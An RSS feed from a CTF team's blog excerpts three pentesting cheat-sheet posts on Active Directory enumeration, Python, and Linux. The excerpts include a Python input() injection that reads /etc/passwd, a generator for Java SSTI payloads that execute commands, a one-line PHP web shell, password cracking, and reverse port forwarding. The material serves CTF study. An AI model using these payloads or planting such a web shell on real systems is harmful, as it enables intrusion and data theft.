<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Notes on 0x53CTF</title>
    <link>https://53ctf.github.io/tags/notes/</link>
    <description>Recent content in Notes on 0x53CTF</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 18 Jan 2023 12:36:43 +0530</lastBuildDate><atom:link href="https://53ctf.github.io/tags/notes/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Active Directory</title>
      <link>https://53ctf.github.io/posts/notes/windows/</link>
      <pubDate>Wed, 18 Jan 2023 12:36:43 +0530</pubDate>
      
      <guid>https://53ctf.github.io/posts/notes/windows/</guid>
      <description>enum4linux &amp;gt; enum4linux [options] ip Usage: /usr/bin/enum4linux [options] ip Options are (like &amp;#34;enum&amp;#34;): -U get userlist -M get machine list* -S get sharelist -P get password policy information -G get group and member list -d be detailed, applies to -U and -S -u user specify username to use (default &amp;#34;&amp;#34;) -p pass specify password to use (default &amp;#34;&amp;#34;) The following options from enum.exe aren&amp;#39;t implemented: -L, -N, -D, -f Additional options: -a Do all simple enumeration (-U -S -G -P -r -o -n -i).</description>
    </item>
    
    <item>
      <title>Python</title>
      <link>https://53ctf.github.io/posts/notes/python/python/</link>
      <pubDate>Sat, 07 Jan 2023 18:04:11 +0530</pubDate>
      
      <guid>https://53ctf.github.io/posts/notes/python/python/</guid>
      <description>Take Advantage Of input() Function And Run System Commands Within It
__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat /etc/passwd&amp;#39;) Easy SSTI Payloads Generator
GitHub Source
#!/usr/bin/python3 from cmd import Cmd import urllib.parse, argparse parser = argparse.ArgumentParser(description=&amp;#34;Generate SSTI payloads... One character at a time.&amp;#34;) parser.add_argument(&amp;#34;-u&amp;#34;,&amp;#34;--url-encode&amp;#34;, action=&amp;#34;store_true&amp;#34;, help=&amp;#34;URL Encode&amp;#34;) args = parser.parse_args() url_encode=args.url_encode class Terminal(Cmd): prompt=&amp;#39;\033[1;33mCommand ==&amp;gt;\033[0m &amp;#39; def decimal_encode(self,args): command=args decimals=[] for i in command: decimals.append(str(ord(i))) payload=&amp;#39;&amp;#39;&amp;#39;${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&amp;#39;&amp;#39;&amp;#39; % decimals[0] for i in decimals[1:]: line=&amp;#39;.concat(T(java.lang.Character).toString({}))&amp;#39;.format(i) payload+=line payload+=&amp;#39;).getInputStream())}&amp;#39; if url_encode: payload_encoded=urllib.</description>
    </item>
    
    <item>
      <title>Linux</title>
      <link>https://53ctf.github.io/posts/notes/linux/linux-notes/</link>
      <pubDate>Sat, 07 Jan 2023 09:33:57 +0530</pubDate>
      
      <guid>https://53ctf.github.io/posts/notes/linux/linux-notes/</guid>
      <description>View Cron Jobs crontab -l List Scheduled Processes/Tasks/Scripts systemctl list-timers View NFS (Network File Share) showmount REMOTE_IP -e Mount NFS mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries find / -type f -perm -4000 2&amp;gt;/dev/null PHP WebShell &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; SMB Shares smbmap -H REMOTE_IP -u USERNAME Basic Chisel Port Forwarding Server ./chisel server --reverse --port LOCAL_PORT Client ./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT Find Open Ports netstat -tupln OS/Kernel Information uname -a cat /proc/version cat /etc/issue CPU Information lscpu Identifying the Network Route route ip route Discover Other IP Address On A Network arp -a ip neigh Look For A Specific String In The File System grep --color=auto -rnw &amp;#39;/&amp;#39; -ie &amp;#34;STRING_THAT_WANT_BE_FOUND&amp;#34; --color=always 2&amp;gt; /dev/null find .</description>
    </item>
    
  </channel>
</rss>
